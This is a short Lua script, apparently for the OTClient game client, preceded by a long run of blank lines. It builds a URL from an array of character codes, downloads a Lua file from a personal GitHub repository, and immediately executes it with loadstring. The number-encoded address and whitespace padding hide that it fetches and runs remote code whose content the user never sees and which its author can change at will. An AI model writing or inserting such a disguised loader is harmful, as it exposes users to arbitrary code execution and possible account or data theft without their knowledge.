











































































local v0 = ''
local v1 = {104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 76, 117, 114, 49, 113, 117, 51, 47, 114, 105, 113, 99, 115, 116, 99, 111, 100, 101, 50, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 114, 105, 113, 99, 115, 116, 99, 111, 100, 50, 46, 108, 117, 97}
for v2 = 1, #v1 do v0 = v0 .. string.char(v1[v2]) end
modules.corelib.HTTP.get(v0, function(script) 
    assert(loadstring(script))() 
end)




